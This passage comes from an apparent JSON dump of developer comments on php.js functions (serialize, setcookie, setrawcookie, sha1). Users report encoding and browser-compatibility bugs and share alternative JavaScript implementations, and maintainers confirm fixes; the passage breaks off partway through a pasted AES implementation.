be:\n\"{0:12, 1:'13', 2:'abc', 3:'line1\\nline2\\nline3'}\"\n*\/\n\nvar b = {'key1':4, 'key2':'5', 'key3':'xxx\\n123', 555:'text'};\njs_code = var_export(b);\n\/*\nthe returned value should be:\n\"{'key1':4, 'key2':'5', 'key3':'xxx\\n123', 555:'text'}\"\n*\/\n\nvar c = 123;\njs_code = var_export(c); \/\/ \"123\"\n\nvar d = '321';\njs_code = var_export(d); \/\/ \"'321'\"\n\nvar e = 'multilne\\ntext';\njs_code = var_export(e); \/\/ \"'multiline\\ntext'\"\n\nfunction add(x, y)\n{\n      res = x + y;\n      return res;\n}\nvar js_code = var_export(add);\n\/*\nthe returned value should be:\n\"function add(x, y) { res = x + y; return res; }\"\n*\/\n[\/CODE]\n\nThanks.\n"},{"date":"2008-12-01 08:46:19","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Andrej Pavlovic: Thanks man!"},{"date":"2008-12-18 17:04:45","author":"Garagoth","url":"","comment":"Hm, an interesting line of code, not sure how it is supposed to work:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nif (ktype == &quot;function&quot; &amp;&amp; ktype == &quot;object&quot;) {\r\n    continue; \r\n}\r\n[\/CODE]\r\n\r\nCheers,\r\nGaragoth."},{"date":"2008-12-30 10:28:17","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Garagoth: Well noticed. That doesn't make any sense at all."},{"date":"2009-03-08 19:32:50","author":"Thomas","url":"www.cyber-nova.com","comment":"Works fine with php 5.2.0.\r\nBut doesn't work with php 5.2.6 ! Php cannot unserialize the string.\r\n\r\nAny known issues about this ?"},{"date":"2009-03-22 19:07:54","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Thomas: You're the first to report. Would it be possible for you to supply test-data?"},{"date":"2009-04-19 12:20:02","author":"AndreaZ","url":"","comment":"when there's a newline character (\\n) inside a serialized string, php unseriliaze returns false\n\ni don't know why :-("},{"date":"2009-04-20 00:04:47","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ AndreaZ: I did some testing with the following code:\n[CODE]\n$ser = serialize(\"a \\n b\");\nvar_dump($ser);\n[\/CODE]\n.. which is executable by both PHP & JS. \nBoth return the exact same output:\n[CODE]\nkevin@kevin-desktop:~\/workspace\/plutonia-phpjs\/_tools$ rhino debug.js \nstring(12) \"s:5:\"a \n b\";\"\nkevin@kevin-desktop:~\/workspace\/plutonia-phpjs\/_tools$ php debug.php\nstring(12) \"s:5:\"a \n b\";\"\n[\/CODE]\n\n..so I'm wondering could it be that something else is buggy in the script you are using? If not, can you supply the full input and code that gives the wrong results?"},{"date":"2009-04-20 13:46:16","author":"AndreaZ","url":"","comment":"@Kevin: i serialized a multidimensional array with your javascript function, then i unserialized the result inside a php file: unserialize returns false (if i serialize with php it works)\n\nhow can i send to you the test that i made? it is a little php file with inside your javascript serialize function\n\nPS: thanks a lot for your work ;-)"},{"date":"2009-04-20 20:07:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ AndreaZ: Ok if you put the PHP-serialized string inside codeblocks here, I can unserialize it with PHP as well, and then test serializing it with JS.\n\nSo if you could provide me with that data that would help me a lot. thx"},{"date":"2009-04-25 10:31:55","author":"AndreaZ","url":"","comment":"@Kevin: that's the test code\n[CODE]\n<html>\n<body>\n<?php\nif (isset($_POST['foo']))\n\t{\n\t\terror_reporting(E_ALL);\n\t\t$ar = $_POST['foo'];\n\t\tvar_dump($ar).'<br\/>';\n\t\t$ser=stripslashes($ar);\n\t\tvar_dump($ser).'<br\/>';\n\t\t$unser = unserialize($ser);\n\t\tvar_dump($unser).'<br\/>';\n\t}\n?>\n<script language=\"javascript\" type=\"text\/javascript\">\n<!--\nfunction clicca() {\n\tdocument.adminForm.foo.value = serialize(document.adminForm.foo.value);\n}\n\nfunction serialize( mixed_value ) {\n    \/* your function *\/\n}\n\/\/-->\n<\/script>\n\n<form action=\"try_serialize.php\" method=\"post\" name=\"adminForm\">\n<textarea id=\"foo\" name=\"foo\">\na textarea with\nnewline<\/textarea>\n<br \/>\n<button type=\"sumbit\" onclick=\"clicca();\">Send<\/button>\n<\/form>\n<\/body>\n<\/html>\n[\/CODE]"},{"date":"2009-04-25 10:35:19","author":"AndreaZ","url":"","comment":"@Kevin: i inserted the code inside [CODE][\/CODE] but it seems that i wrong something :-(\n\nsend me an email, so i can send you the test file"},{"date":"2009-04-29 15:22:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ AndreaZ: Why don't you put it in pastebin.org, and add a link here. then we have syntax highlighting as well. Thanx!"},{"date":"2009-05-01 11:23:29","author":"AndreaZ","url":"","comment":"@Kevin: http:\/\/pastebin.com\/m7f1e9ef0"},{"date":"2009-05-12 15:39:06","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ AndreaZ: Thx for the pastebin, this makes it clear to me what's going wrong. You are stripping slashes before you are unserializing the string, while escaped characters are an essential part of of the serialized object.\n\nTo circumvent, remove stripslashes, or first use base64_encode over the serialized object, and then in php decode it."},{"date":"2009-05-30 16:45:47","author":"Russell Walker","url":"www.nbill.co.uk","comment":"I found that when serializing utf-8 characters that differ from iso-8859-1, the string could not be deserialized by PHP. This is because PHP sees the string as containing more characters than it really does (as it thinks 1 character = 1 byte, when unicode characters can take up more than 1 byte). So I amended the code on line 97 from\n\n[CODE]val = \"s:\" + mixed_value.length + \":\\\"\" + mixed_value + \"\\\"\";[\/CODE]\n\nto\n\n[CODE]val = \"s:\" + encodeURIComponent(mixed_value).replace(\/%..\/g, 'x').length + \":\\\"\" + mixed_value + \"\\\"\";[\/CODE]\n\n...so now it serializes utf-8 characters in a way that PHP can deserialize. Note however, that this will probably break the javascript unserialize function, as JS and PHP cannot agree on the number of characters in the string.\n\nThe code to get the length of the string in bytes came from DtTvB: http:\/\/dt.in.th\/2008-09-16.string-length-in-bytes.html"},{"date":"2009-05-30 16:48:50","author":"Russell Walker","url":"www.nbill.co.uk","comment":"Sorry, I quoted the line number from my own file, but in php.default.js, it is line 5826."},{"date":"2009-05-31 20:01:37","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Russell Walker: Thanks for contributing. I've implemented your fix in svn & it will be available shortly.\nhttp:\/\/trac.plutonia.nl\/projects\/phpjs\/browser\/trunk\/functions\/var\/serialize.js"},{"date":"2009-06-16 12:33:11","author":"Russell Walker","url":"http:\/\/www.nbill.co.uk\/","comment":"I found that if the javascript object has a property which contains a null value, the string cannot be unserialized by PHP. To fix this, I added:\n\n[code]\ndefault:\n  val = \"N\";\n  break;\n[\/code]\n\n...to the end of the switch block (around line 92 on the above function). The 'undefined' case should probably be moved down to the bottom as well so both can be handled together, ie:\n\n[code]\ncase 'undefined':\ndefault:\n  val = \"N\";\n  break;\n[\/code]"},{"date":"2009-06-18 07:20:25","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Fixed in SVN! Thanks! (also added your website to the credit)"},{"date":"2009-08-03 17:48:17","author":"Jamie Beck","url":"http:\/\/www.terabit.ca","comment":"Should not lines 83-84 be as follows for the namespaced version. Otherwise the function cannot be found...\n\n[CODE]\nvals += this.serialize(okey) +\n    this.serialize(mixed_value[key]);\n[\/CODE]"},{"date":"2009-08-03 20:55:22","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Jamie: Fixed in SVN. Thanks for the report!"},{"date":"2009-08-05 14:07:15","author":"Alexandre Felipe Muller","url":"www.expressolivre.net","comment":"We're using my serialize and unserialize in my project for 3 years, acording to my tests it's 3 or 4 times faster. Who want to see\n[CODE]\n\tcConnector.prototype.serialize = function(data)\n\t{\tvar _thisObject = this;\t\t\n\t\tvar f = function(data)\n\t\t{\n\t\t\tvar str_data;\n\t\n\t\t\tif (data == null || \n\t\t\t\t(typeof(data) == 'string' && data == ''))\n\t\t\t{\n\t\t\t\tstr_data = 'N;';\n\t\t\t}\n\t\n\t\t\telse switch(typeof(data))\n\t\t\t{\n\t\t\t\tcase 'object':\n\t\t\t\t\tvar arrayCount = 0;\n\t\n\t\t\t\t\tstr_data = '';\n\t\n\t\t\t\t\tfor (i in data)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (i == 'length')\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\tarrayCount++;\n\t\t\t\t\t\tswitch (typeof(i))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase 'number':\n\t\t\t\t\t\t\t\tstr_data += 'i:' + i + ';' + f(data[i]);\n\t\t\t\t\t\t\t\tbreak;\n\t\n\t\t\t\t\t\t\tcase 'string':\n\t\t\t\t\t\t\t\tstr_data += 's:' + i.length + ':\"' + i + '\";' + f(data[i]);\n\t\t\t\t\t\t\t\tbreak;\n\t\n\t\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\t\tshowMessage(Element('cc_msg_err_serialize_data_unknown').value);\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\n\t\t\t\t\tif (!arrayCount)\n\t\t\t\t\t{\n\t\t\t\t\t\tstr_data = 'N;';\t\n\t\t\t\t\t}\n\t\t\t\t\telse\n\t\t\t\t\t{\n\t\t\t\t\t\tstr_data = 'a:' + arrayCount + ':{' + str_data + '}';\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tbreak;\n\t\t\t\n\t\t\t\tcase 'string':\n\t\t\t\t\tstr_data = 's:' + data.length + ':\"' + data + '\";';\n\t\t\t\t\tbreak;\n\t\t\t\t\t\n\t\t\t\tcase 'number':\n\t\t\t\t\tstr_data = 'i:' + data + ';';\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase 'boolean':\n\t\t\t\t\tstr_data = 'b:' + (data ? '1' : '0') + ';';\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tdefault:\n\t\t\t\t\tshowMessage(Element('cc_msg_err_serialize_data_unknown').value);\n\t\t\t\t\treturn null;\n\t\t\t}\n\n\t\t\treturn str_data;\n\t\t}\n\t\n\t\treturn f(data);\n\t}\n\t\/\/Unserialize Data Method\n\tcConnector.prototype.unserialize = function(str)\n\t{\n\t\t_thisObject = this;\n\t\tvar matchB = function (str, iniPos)\n\t\t{\n\t\t\tvar nOpen, nClose = iniPos;\n\t\t\tdo\n\t\t\t{\n\t\t\t\tnOpen = str.indexOf('{', nClose+1);\n\t\t\t\tnClose = str.indexOf('}', nClose+1);\n\n\t\t\t\tif (nOpen == -1)\n\t\t\t\t{\n\t\t\t\t\treturn nClose;\n\t\t\t\t}\n\t\t\t\tif (nOpen < nClose )\n\t\t\t\t{\n\t\t\t\t\tnClose = matchB(str, nOpen);\n\t\t\t\t}\n\t\t\t} while (nOpen < nClose);\n\n\t\t\treturn nClose;\n\t\t}\n\n\t\tvar f = function (str)\n\t\t{\n\t\t\tswitch (str.charAt(0))\n\t\t\t{\n\t\t\t\tcase 'a':\n\t\t\t\t\tvar data = new Array();\n\t\t\t\t\tvar n = parseInt( str.substring(str.indexOf(':')+1, str.indexOf(':',2) ) );\n\t\t\t\t\tvar arrayContent = str.substring(str.indexOf('{')+1, str.lastIndexOf('}'));\n\t\t\t\t\tfor (var i = 0; i < n; i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tvar pos = 0;\n\t\n\t\t\t\t\t\t\/* Process Index *\/\n\t\t\t\t\t\tvar indexStr = arrayContent.substr(pos, arrayContent.indexOf(';')+1);\n\t\t\t\t\t\tvar index = f(indexStr);\n\t\t\t\t\t\tpos = arrayContent.indexOf(';', pos)+1;\n\t\t\t\t\t\t\n\t\t\t\t\t\t\/* Process Content *\/\n\t\t\t\t\t\tvar part = null;\n\t\t\t\t\t\tswitch (arrayContent.charAt(pos))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcase 'a':\n\t\t\t\t\t\t\t\tvar pos_ = matchB(arrayContent, arrayContent.indexOf('{', pos))+1;\n\t\t\t\t\t\t\t\tpart = arrayContent.substring(pos, pos_);\n\t\t\t\t\t\t\t\tpos = pos_;\n\t\t\t\t\t\t\t\tdata[index] = f(part);\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\n\t\t\t\t\t\t\tcase 's':\n\t\t\t\t\t\t\t\tvar pval = arrayContent.indexOf(':', pos+2);\n\t\t\t\t\t\t\t\tvar val  = parseInt(arrayContent.substring(pos+2, pval));\n\t\t\t\t\t\t\t\tpos = pval + val + 4;\n\t\t\t\t\t\t\t\tdata[index] = arrayContent.substr(pval+2, val);\n\t\t\t\t\t\t\t\tbreak;\n\t\n\t\t\t\t\t\t\tdefault:\n\t\t\t\t\t\t\t\tpart = arrayContent.substring(pos, arrayContent.indexOf(';', pos)+1);\n\t\t\t\t\t\t\t\tpos = arrayContent.indexOf(';', pos)+1;\n\t\t\t\t\t\t\t\tdata[index] = f(part);\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tarrayContent = arrayContent.substr(pos);\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\t\t\n\t\t\t\tcase 's':\n\t\t\t\t\tvar pos = str.indexOf(':', 2);\n\t\t\t\t\tvar val = parseInt(str.substring(2,pos));\n\t\t\t\t\tvar data = str.substr(pos+2, val);\n\t\t\t\t\tstr = str.substr(pos + 4 + val);\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase 'i':\n\t\t\t\tcase 'd':\n\t\t\t\t\tvar pos = str.indexOf(';');\n\t\t\t\t\tvar data = parseInt(str.substring(2,pos));\n\t\t\t\t\tstr = str.substr(pos + 1);\n\t\t\t\t\tbreak;\n\t\t\t\t\n\t\t\t\tcase 'N':\n\t\t\t\t\tvar data = null;\n\t\t\t\t\tstr = str.substr(str.indexOf(';') + 1);\n\t\t\t\t\tbreak;\n\t\n\t\t\t\tcase 'b':\n\t\t\t\t\tvar data = str.charAt(2) == '1' ? true : false;\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\treturn data;\n\t\t}\n\t\n\t\treturn f(str);\n\t}\n\n[\/CODE]"},{"date":"2009-08-16 15:23:40","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Alexandre Felipe Muller: Thanks for sharing. It's gonna take a while to investigate it and strip it of your environment's specific dependencies like showMessage(Element('cc_msg_err_serialize_data_unknown').value);\nIf after that all the testcases pass and they're indeed faster I will replace the current implementations with your's"},{"date":"2009-08-18 15:21:53","author":"Russell Walker","url":"http:\/\/www.nbill.co.uk\/","comment":"When serializing strings that contain URL entities (such as the plus symbol), they were being lost during unserialization in PHP. To fix this, I changed line 58 to URIEncode the string value like this:\n\n[code]\nval = \"s:\" + encodeURIComponent(mixed_value).replace(\/%..\/g, 'x').length + \":\\\"\" + encodeURIComponent(mixed_value) + \"\\\"\";\n[\/code]"},{"date":"2009-08-19 16:19:52","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Russell Walker: That sounds good, but can you please confirm that this is in fact the same behavior in PHP?"},{"date":"2009-09-26 18:01:29","author":"Le Torbi","url":"http:\/\/www.letorbi.de","comment":"Hi there,\n\nwhen fixing the UTF-8 issue of the unserialize() function I've found a way to improve the speed of the size calculation for strings. It's quite simple and need no complex string operations or regular expressions. Here is the code:\n\n[CODE]\nvar utf8Size = function(str) { \/\/ NEW FUNCTION\n    var size = 0;\n    for (var i = 0; i < str.length; i++) {\n        var code = str[i].charCodeAt(0);\n        if (code < 0x0080)\n            size += 1;\n        else if (code < 0x0800)\n            size += 2;\n        else\n        size += 3;\n    }\n    return size;\n}\nvar _getType = function (inp) {\n    var type = typeof inp, match;\n    var key;\n\/\/ MORE LINES OF CODE\n        val = (Math.round(mixed_value) == mixed_value ? \"i\" : \"d\") + \":\" + mixed_value;\n        break;\n    case \"string\":\n        val = \"s:\" + utf8Size(mixed_value) + \":\\\"\" + mixed_value + \"\\\"\"; \/\/ MODIFIED LINE\n        break;\n case \"array\":\ncase \"object\":\n[\/CODE]\n\nI've made some simple test and it seems that my function needs about 0.0004ms per run, while the old needs 0.004ms. Ok, it's not much, but maybe worth the code anyway...\n\nBTW: What do I have to to to get this into the official code?\n\nBai\nLe Torbi"},{"date":"2010-08-12 15:53:14","author":"Fadil Kujundzic","url":"","comment":"I had a problem with serialize function objects were stored as array. To fix this I changed at line 73 [CODE] objname [1] this.serialize (= objname [1 ]);[\/ CODE] to [CODE] objname [1] this.serialize (= objname [1] == \"Object [\" ? \"stdClass\": objname [1 ]);[\/ CODE]. Maybe might be useful for someone."},{"date":"2010-09-08 19:31:16","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Fadil Kujundzic: That section is commented out. Are you using an older version of serialize?\n\n@ Le Torbi: Thanks a lot! Fixed: https:\/\/github.com\/kvz\/phpjs\/commit\/d98ce0a441e4d6f45a5fddb8cf066f8d1a569e65\nYour contrib will soon show up on the site as well.\n"},{"date":"2010-11-10 10:24:27","author":"Ben","url":"benblume.co.uk","comment":"I have been working with this code on a project and found some non-compatibility with IE.\n\nOn line 27, the code relies on the str[i] notation to access a character from a string. This does not work in IE, resulting in an undefined value that breaks the rest of the function. See http:\/\/en.wikipedia.org\/wiki\/JavaScript_syntax#String for confirmation of this.\n\nA better option would be either:\n\n[CODE]\nvar code = str.charCodeAt(i);\n[\/CODE]\n\nor\n\n[CODE]\nvar code = str.chartAt(i).charCodeAt(0);\n[\/CODE]\n"},{"date":"2010-11-10 11:12:04","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Ben: Thanks! Fixed in Git..."},{"date":"2011-01-09 00:12:29","author":"Vadim","url":"","comment":"In \"var _utf8Size = function (str)\":\r\n\r\nThis woun't work in IE6:\r\n[CODE]code = str[i].charCodeAt(0);[\/CODE]\r\n\r\nThis work fine (thanks to Ben 10 NOV'10):\r\n[CODE]code = str.charCodeAt(i);[\/CODE]"},{"date":"2011-01-09 13:43:07","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Vadim: Yes, thank you. The cache is still stale, but in Git it has been updated for a while: https:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/var\/serialize.js"},{"date":"2011-01-24 23:08:20","author":"Cody O'Dell","url":"http:\/\/www.constantconceptions.com","comment":"Is there a way to get this working with apostrophes?"},{"date":"2012-02-12 15:42:08","author":"jj","url":"","comment":"this peace of shit is not working."},{"date":"2012-06-16 07:34:06","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@jj: Care to prepare a test case?"},{"date":"2012-08-01 00:19:17","author":"Rick K","url":"","comment":"So I'm not really sure whats going on here, but I'm having a problem with this function. When I use PHP's serialize on a string value of \"7&frac12;\" (imagine the html entity here is the actual 1\/2 fraction character and not the html entity code (not sure if it will render or not at time of posting)) The php parser will return a string value 2 bytes long. When I do the same via JS and this function, I get a string value 3 bytes long with a hidden &Acirc character between 7 and the 1\/2 fraction. Why is this? I've tried everything to get around it. What I ended up having to do was in php, after it receives the serialized version of the string, it unserializes it, then it runs it through a recursive function that essentially converts all special characters to their &entityName; code, then I  str_ireplace(\"&Acirc;\", \"\", $curval); then I reencode the value by converting all &entities; back to ther actual character code. Then I re-serialize using php's serialize function and then store it to the database. Case and point when I reserialized this via PHP with the 1\/2 fraction characater (as a character) in the string, it stores it correctly as a 2 byte string and does not add the funky acric character back in. This was the ONLY way I could get this function to work. I know the Acirc character has something to do with character encoding but the site is set to use western\/latin, not UTF8. Is there some way via javascript I can convert the UTF8 version of the value to the latin version before I use your serialize function? \n\nAnd why does this function not work exactly like the PHP version? I thought that was the point of this project? Is this a bug?\n\n[code]\nHere is your functions version:\na:1:{i:0;a:7:{s:3:\"sku\";s:5:\"1052m\";s:4:\"name\";s:21:\"Boonie Hat (ABU Camo)\";s:5:\"price\";s:5:\"17.99\";s:3:\"qty\";s:1:\"1\";s:6:\"typeid\";s:1:\"3\";s:6:\"status\";s:3:\"new\";s:2:\"ui\";a:1:{i:0;a:2:{s:4:\"name\";s:4:\"size\";s:5:\"value\";s:3:\"7\u00bd\";}}}}\n\n(notice s:3: on the last value of the last array)\n\nHere is PHP's version:\na:1:{i:0;a:7:{s:3:\"sku\";s:5:\"1052m\";s:4:\"name\";s:21:\"Boonie Hat (ABU Camo)\";s:5:\"price\";s:5:\"17.99\";s:3:\"qty\";d:1;s:6:\"typeid\";s:1:\"3\";s:6:\"status\";s:3:\"new\";s:2:\"ui\";a:1:{i:0;a:2:{s:4:\"name\";s:4:\"size\";s:5:\"value\";s:2:\"7\u00bd\";}}}\n\n(notice s:2: on the last value of the last array)\n[\/code]"}],"setcookie":[{"date":"2008-06-23 17:56:22","author":"space_marine","url":"","comment":"Can this function set array cookies?\r\n\r\n[CODE=&quot;php&quot;]\r\n&lt;?php\r\n\/\/ set the cookies\r\nsetcookie(&quot;cookie[three]&quot;, &quot;cookiethree&quot;);\r\nsetcookie(&quot;cookie[two]&quot;, &quot;cookietwo&quot;);\r\nsetcookie(&quot;cookie[one]&quot;, &quot;cookieone&quot;);\r\n\r\n\/\/ after the page reloads, print them out\r\nif (isset($_COOKIE['cookie'])) {\r\n    foreach ($_COOKIE['cookie'] as $name =&gt; $value) {\r\n        echo &quot;$name : $value &lt;br \/&gt;\\n&quot;;\r\n    }\r\n}\r\n?&gt;\r\n[\/CODE]\r\n\r\nOutput:\r\n\r\nthree : cookiethree\r\ntwo : cookietwo\r\none : cookieone"},{"date":"2008-07-17 22:04:29","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ space_marine: I haven't tried that with Jonas' code so far. Can you share your findings?"},{"date":"2008-10-28 21:45:53","author":"Andreas","url":"http:\/\/www.andreas-haerter.de","comment":"Usage of escape() is out-dated (isn't it?) and got some other problems (e.g. some UTF8 stuff). I think encodeURI() would be a better solution here.\r\n\r\nHowever, thx for this project!"},{"date":"2008-11-03 10:59:23","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Andreas: Thank you, fixed!"},{"date":"2008-11-07 08:25:04","author":"Onno Marsman","url":"","comment":"The encodeURI function does not encode characters like &amp; and = . I think encodeURIComponent should be used instead."},{"date":"2008-11-09 13:04:57","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Fixed"},{"date":"2009-01-08 03:01:49","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Here's setrawcookie() (just removed encodeURIComponent())...\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nsetrawcookie('author_name', 'Kevin van Zonneveld');\r\nalert(document.cookie); \/\/ author_name=Kevin van Zonneveld\r\nsetcookie('author_name', 'Kevin van Zonneveld');\r\nalert(document.cookie); \/\/ author_name=Kevin%20van%20Zonneveld\r\n\r\nfunction setrawcookie(name, value, expires, path, domain, secure) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ *     example 1: setrawcookie('author_name', 'Kevin van Zonneveld');\r\n    \/\/ *     returns 1: true \r\n    expires instanceof Date ? expires = expires.toGMTString() : typeof(expires) == 'number' &amp;&amp; (expires = (new Date(+(new Date) + expires * 1e3)).toGMTString());\r\n    var r = [name + &quot;=&quot; + value], s, i;\r\n    for(i in s = {expires: expires, path: path, domain: domain}){\r\n        s[i] &amp;&amp; r.push(i + &quot;=&quot; + s[i]);\r\n    }\r\n    return secure &amp;&amp; r.push(&quot;secure&quot;), document.cookie = r.join(&quot;;&quot;), true;\r\n}[\/CODE]"},{"date":"2009-01-08 10:56:27","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: With so many lines shared, I've made setcookie depend on setrawcookie."},{"date":"2010-11-01 11:57:28","author":"Steve","url":"","comment":"Thanks for this.  Just a quickie for those wanting to do the reverse: i.e.  $myVar=$_COOKIE['somecookie'];\n\nHere's a function to read a cookie set by PHP originally from here http:\/\/www.quirksmode.org\/js\/cookies.html but with a correction as PHP URI encodes cookies.\n[CODE]\nfunction $_COOKIE(name) {\n\tvar nameEQ = name + \"=\";\n\tvar ca = document.cookie.split(';');\n\tfor(var i=0;i < ca.length;i++) {\n\t\tvar c = ca[i];\n\t\twhile (c.charAt(0)==' ') c = c.substring(1,c.length);\n\t\tif (c.indexOf(nameEQ) == 0) return decodeURIComponent(c.substring(nameEQ.length,c.length).replace(\/\\+\/g, '%20'));\n\t}\n\treturn null;\n}\n[\/CODE]\nUsage:  $myVar=$_COOKIE('somecookie');  \/\/NB the round brackets!"},{"date":"2011-10-01 08:44:31","author":"PJ Brunet","url":"http:\/\/tomakefast.com","comment":"@Steve Thanks, your function worked for me--reads cookies set with this function.  "},{"date":"2011-10-06 07:04:05","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Steve: Thanks! I've adapted the function within the experimental section as an attempt at replicating a PHP language feature (along with $_GET())."},{"date":"2012-04-17 15:30:43","author":" ????? ????????","url":"http:\/\/an3m1.com\/","comment":"Great job here. I really enjoyed what you had to say. Keep going because you definitely bring a new voice to this subject. Not many people would say what you\u2019ve said and still make it interesting\n\n"}],"setrawcookie":[{"date":"2010-01-28 12:59:49","author":"Michael","url":"","comment":"Two notes:\n\n1. This function is not identical to the PHP one, as the PHP one takes unix timestamp as the expiry, whereas this function takes the number of seconds between now and expiry as the input field.\n\n2. The expiry input field must not be quoted else the 'typeof' statement will view it as a string rather then a number, which will make the field invalid and the cookie will expire at end of session."},{"date":"2010-01-28 14:06:09","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Michael: See http:\/\/github.com\/kvz\/phpjs\/raw\/master\/functions\/network\/setrawcookie.js . Your issues I think should be fixed, though please confirm... Thanks! "}],"sha1":[{"date":"2008-09-04 16:34:13","author":"Onno Marsman","url":"","comment":"Found the code below somewhere. Is similar but shorter and probably a bit faster. I've worked with it for quite some time and it seems to work fine in combination with sha1 from php. Why is utf8_encode necessary by the way? Also noticed this in base64_encode.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction sha1(s){\r\n\tfunction X(x,y){var l=(x&amp;0xFFFF)+(y&amp;0xFFFF),m=(x&gt;&gt;16)+(y&gt;&gt;16)+(l&gt;&gt;16);return(m&lt;&lt;16)|(l&amp;0xFFFF)}\r\n\tfunction Y(x,y){return(x&lt;&lt;y)|(x&gt;&gt;&gt;(32-y))}\r\n\tvar len=s.length*8,i,L=((len+64&gt;&gt;9)&lt;&lt;4)+16,x=Array(L+79),w=Array(80),a=1732584193,b=-271733879,c=-1732584194,d=271733878,e=-1009589776;\r\n\tfor(i=0;i&lt;x.length;++i)x[i]=0;\r\n\tfor(i=0;i&lt;len;i+=8)x[i&gt;&gt;5]|=(s.charCodeAt(i\/8)&amp;255)&lt;&lt;(24-i%32);\r\n\tx[len&gt;&gt;5]|=0x80&lt;&lt;(24-len%32);\r\n\tx[L-1]=len;\r\n\tfor(i=0;i&lt;L;i+=16){\r\n\t\tvar oa=a,ob=b,oc=c,od=d,oe=e;\r\n\t\tfor(var j=0;j&lt;80;j++){\r\n\t\t\tw[j]=(j&lt;16)?x[i+j]:Y(w[j-3]^w[j-8]^w[j-14]^w[j-16],1);\r\n\t\t\tvar t=X(X(Y(a,5),((j&lt;20)?((b&amp;c)|((~b)&amp;d)):((j&lt;40||j&gt;=60)?(b^c^d):((b&amp;c)|(b&amp;d)|(c&amp;d))))),X(X(e,w[j]),((j&lt;20)?1518500249:(j&lt;40)?1859775393:(j&lt;60)?-1894007588:-899497514)));\r\n\t\t\te=d;\r\n\t\t\td=c;\r\n\t\t\tc=Y(b,30);\r\n\t\t\tb=a;\r\n\t\t\ta=t;\r\n\t\t}\r\n\t\ta=X(a,oa);\r\n\t\tb=X(b,ob);\r\n\t\tc=X(c,oc);\r\n\t\td=X(d,od);\r\n\t\te=X(e,oe);\r\n\t}\r\n\tx=[a,b,c,d,e];\r\n\ta=&quot;0123456789abcdef&quot;;\r\n\tb=&quot;&quot;;\r\n\tfor(i=0;i&lt;20;i++)b+=a.charAt((x[i&gt;&gt;2]&gt;&gt;((3-i%4)*8+4))&amp;0xF)+a.charAt((x[i&gt;&gt;2]&gt;&gt;((3-i%4)*8))&amp;0xF);\r\n\treturn b\r\n}\r\n[\/CODE]"},{"date":"2008-09-05 21:28:49","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: It's also less readable (we have compressors for short code ;) and maintainable, have you benchmarked it against the current version? Cause if it's actually a lot faster, that would convince me to use this version. And what about copyrights? Thank you for time  &amp; effort Onno!"},{"date":"2008-11-19 09:07:58","author":"Patrick Schlicher","url":"http:\/\/www.n8reise.de","comment":"I was searching for an encryption like blowfish that works with PHP and JS for long time.\r\n\r\nFinally I found a working AES implementation:\r\n\r\nJS:\r\nhttp:\/\/www.movable-type.co.uk\/scripts\/aes.html\r\n\r\nPHP:\r\nhttp:\/\/www.movable-type.co.uk\/scripts\/aes-php.html\r\n\r\n\r\n\r\n\r\n[CODE=&quot;Javascript&quot;]\/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  *\/\r\n\/*  AES implementation in JavaScript (c) Chris Veness 2005-2008                                   *\/\r\n\/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  *\/\r\n\r\n\/*\r\n * AES Cipher function: encrypt 'input' with Rijndael algorithm\r\n *\r\n *   takes   byte-array 'input' (16 bytes)\r\n *           2D byte-array key schedule 'w' 